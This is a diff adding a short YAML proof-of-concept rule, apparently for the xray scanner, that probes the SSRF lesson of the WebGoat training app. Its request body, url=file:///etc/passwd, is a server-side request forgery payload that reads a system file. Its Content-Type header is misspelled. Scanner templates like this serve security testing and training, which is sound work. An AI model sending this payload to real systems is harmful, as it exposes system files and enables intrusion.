@@ -1,0 +1,20 @@
+name: poc-yaml-example-com
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            headers:
+                Content-Type: application/x-www-form-urlcoded
+            path: /WebGoat/SSRF/task2
+            body: url=file:///etc/passwd
+            follow_redirects: true
+        expression: |
+            response.status==200
+expression:
+    r1()
+detail:
+    author: Lousix123
+    links:
+        - https://docs.xray.cool/
